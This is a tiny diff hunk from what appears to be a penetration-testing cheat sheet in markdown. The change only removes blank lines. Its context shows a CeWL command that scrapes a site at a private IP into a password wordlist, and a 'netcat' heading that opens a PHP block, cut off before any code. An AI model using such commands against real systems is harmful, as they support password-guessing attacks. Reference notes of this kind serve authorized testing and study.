@@ -122,8 +122,6 @@
 - ## Cewl <a name="cewl"></a>
 - ```cewl -w passwords.txt http://192.168.245.48:1898/?q=node/1```
 
-
-
 - ## netcat <a name="nc"></a>
 ```php
 <?php
